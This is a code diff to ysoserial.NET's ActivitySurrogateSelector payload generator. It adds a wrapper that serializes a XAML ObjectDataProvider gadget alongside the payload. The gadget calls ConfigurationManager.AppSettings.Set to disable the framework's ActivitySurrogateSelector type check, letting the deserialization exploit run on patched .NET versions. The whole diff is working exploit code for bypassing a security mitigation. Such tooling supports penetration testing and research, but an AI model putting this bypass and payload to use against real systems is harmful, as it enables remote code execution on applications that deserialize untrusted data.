@@ -9,6 +9,7 @@ using System.Reflection;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Web.UI.WebControls;
 using System.Runtime.Serialization;
+using System.Configuration;
 
 namespace ysoserial.Generators
 {
@@ -137,10 +138,39 @@ namespace ysoserial.Generators
             return "ActivitySurrogateSelector";
         }
 
+        internal object WrapPayload(object payload, string formatter, Boolean test)
+        {
+            // Disable type protections during generation
+            ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
+
+            string disable_type_check_xaml = @"<ResourceDictionary
+  xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
+  xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
+  xmlns:System=""clr-namespace:System;assembly=mscorlib""
+  xmlns:Config=""clr-namespace:System.Configuration;assembly=System.Configuration"">
+	<ObjectDataProvider x:Key=""appSettings"" ObjectType = ""{ x:Type Config:ConfigurationManager}"" MethodName = ""get_AppSettings"" ></ObjectDataProvider>
+	<ObjectDataProvider x:Key=""setMethod"" ObjectInstance = ""{StaticResource appSettings}"" MethodName = ""Set"" >
+        <ObjectDataProvider.MethodParameters>
+            <System:String>microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck</System:String>
+            <System:String>true</System:String>
+        </ObjectDataProvider.MethodParameters>
+    </ObjectDataProvider>
+</ResourceDictionary>
+";
+            TextFormattingRunPropertiesMarshal disable_payload = new TextFormattingRunPropertiesMarshal(disable_type_check_xaml);
+
+            List<Object> object_group = new List<Object>();
+
+            object_group.Add(payload);
+            object_group.Add(disable_payload);
+
+            return Serialize(object_group, formatter, test);
+        }
+
         public override object Generate(string cmd, string formatter, Boolean test)
         {
             PayloadClass payload = new PayloadClass();
-            return Serialize(payload, formatter, test);
+            return WrapPayload(payload, formatter, test);
         }
     }
 }
